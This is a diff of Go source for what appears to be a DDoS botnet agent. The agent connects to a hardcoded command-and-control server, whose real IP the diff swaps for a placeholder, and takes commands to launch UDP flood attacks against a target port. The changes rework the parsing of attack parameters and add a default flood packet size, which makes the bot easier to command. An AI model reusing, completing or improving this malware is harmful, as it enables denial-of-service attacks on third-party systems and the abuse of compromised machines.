@@ -21,7 +21,7 @@ import (
 )
 
 const (
-	serverAddr = "45.156.87.180:6703"
+	serverAddr = "urip:6703"
 	retryDelay = 10 * time.Second
 )
 
@@ -135,15 +135,9 @@ func handleUDPCommand(args []string, conn net.Conn) {
 
 		switch key {
 		case "dport":
-			p, err := strconv.Atoi(val)
-			if err == nil {
-				targetPort = p
-			}
+			targetPort = extractInt(val)
 		case "len":
-			l, err := strconv.Atoi(val)
-			if err == nil {
-				packetSize = l
-			}
+			packetSize = extractInt(val)
 		case "group":
 			targetGroup = val
 		case "sport":
@@ -198,15 +192,9 @@ func handleUDPPlainCommand(args []string, conn net.Conn) {
 
 		switch key {
 		case "dport":
-			p, err := strconv.Atoi(val)
-			if err == nil {
-				targetPort = p
-			}
+			targetPort = extractInt(val)
 		case "len":
-			l, err := strconv.Atoi(val)
-			if err == nil {
-				packetSize = l
-			}
+			packetSize = extractInt(val)
 		case "group":
 			targetGroup = val
 		case "sport":
@@ -224,6 +212,10 @@ func handleUDPPlainCommand(args []string, conn net.Conn) {
 	if targetPort == 0 {
 		core.SendResponse(conn, "ERROR: Target port (dport) is required.")
 		return
+	}
+
+	if packetSize == 0 {
+		packetSize = 1024
 	}
 
 	core.SetAttackStop(true)
@@ -604,4 +596,15 @@ func getTotalRAM() int64 {
 		}
 	}
 	return 0
+}
+
+func extractInt(s string) int {
+	var sb strings.Builder
+	for _, r := range s {
+		if r >= '0' && r <= '9' {
+			sb.WriteRune(r)
+		}
+	}
+	val, _ := strconv.Atoi(sb.String())
+	return val
 }
